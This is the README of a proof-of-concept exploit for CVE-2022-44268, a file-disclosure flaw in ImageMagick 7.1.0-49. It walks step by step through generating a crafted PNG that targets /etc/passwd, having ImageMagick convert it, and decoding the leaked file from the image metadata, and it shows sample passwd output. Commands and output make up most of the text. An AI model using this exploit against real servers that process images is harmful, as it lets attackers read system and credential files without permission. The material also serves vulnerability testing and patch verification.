## ImageMagick LFI PoC [CVE-2022-44268]


The researchers at [MetabaseQ](https://www.metabaseq.com/imagemagick-zero-days/) discovered CVE-2022-44268, i.e. ImageMagick 7.1.0-49 is vulnerable to Information Disclosure. When it parses a PNG image (e.g., for resize), the resulting image could have embedded the content of an arbitrary remote file (if the ImageMagick binary has permissions to read it).


## Usage

- Make sure you have ImageMagick, and required Python packages installed.


```console
(~)>>> python3 generate.py -f "/etc/passwd" -o exploit.png

   [>] ImageMagick LFI PoC - by Sybil Scan Research <research@sybilscan.com>
   [>] Generating Blank PNG
   [>] Blank PNG generated
   [>] Placing Payload to read /etc/passwd
   [>] PoC PNG generated > exploit.png
```

- Convert the generated PNG file:

```console
(~)>>> convert exploit.png result.png
```

- Read contents of converted PNG file:

```console
(~)>>> identify -verbose result.png
```

- Decode the data returned in `Raw profile type` field, you will observe the contents of `/etc/passwd`: 

```console
(~)>>> python3 -c 'print(bytes.fromhex("726f6f743a783a726f6f743---REDACTED--").decode("utf-8"))'


root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin

```



## References
- https://www.metabaseq.com/imagemagick-zero-days/
- https://github.com/duc-nt/CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC
